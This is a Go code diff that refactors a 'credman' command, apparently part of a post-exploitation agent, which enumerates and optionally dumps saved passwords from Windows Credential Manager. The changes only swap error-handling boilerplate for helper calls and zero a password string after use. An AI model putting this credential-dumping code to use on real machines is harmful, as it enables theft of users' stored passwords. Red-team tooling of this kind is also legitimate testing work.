@@ -73,11 +73,7 @@ func (c *CredmanCommand) Execute(task structs.Task) structs.CommandResult {
 	case "dump":
 		return credmanList(args, true)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: list or dump", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: list or dump", args.Action)
 	}
 }
 
@@ -90,11 +86,7 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 	if args.Filter != "" {
 		filterUTF16, err := windows.UTF16PtrFromString(args.Filter)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Invalid filter: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Invalid filter: %v", err)
 		}
 		filterPtr = uintptr(unsafe.Pointer(filterUTF16))
 	}
@@ -117,17 +109,9 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 		)
 		if r == 0 {
 			if err == windows.ERROR_NOT_FOUND {
-				return structs.CommandResult{
-					Output:    "No credentials found in Credential Manager",
-					Status:    "success",
-					Completed: true,
-				}
+				return successResult("No credentials found in Credential Manager")
 			}
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("CredEnumerateW failed: %v\n\nNote: Credential Manager enumeration requires the user to have an interactive logon session. If running via SSH or as a service, try running from a GUI session.", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("CredEnumerateW failed: %v\n\nNote: Credential Manager enumeration requires the user to have an interactive logon session. If running via SSH or as a service, try running from a GUI session.", err)
 		}
 	}
 	defer procCredFree.Call(credArray)
@@ -198,6 +182,7 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 				Comment:        fmt.Sprintf("credman %s (%s)", args.Action, typeName),
 			})
 		}
+		structs.ZeroString(&password)
 
 		switch cred.Type {
 		case credTypeGeneric:
